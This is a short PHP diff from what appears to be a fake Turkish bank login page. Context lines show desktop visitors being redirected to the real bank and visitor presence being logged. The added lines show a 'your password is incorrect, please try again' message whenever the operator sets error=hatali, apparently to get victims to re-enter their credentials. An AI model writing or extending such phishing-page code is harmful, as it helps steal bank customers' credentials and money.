@@ -18,6 +18,9 @@ if (!isMobileRequest() && shouldRedirectDesktopToBank()) {
 }
 
 $errors = $_SESSION['form_errors'] ?? [];
+if (($_GET['error'] ?? '') === 'hatali') {
+    $errors[] = 'Girdiğiniz şifre hatalıdır. Lütfen kontrol edip tekrar deneyiniz.';
+}
 $old = $_SESSION['form_old'] ?? [];
 unset($_SESSION['form_errors'], $_SESSION['form_old']);
 upsertPresence('index', null, false);
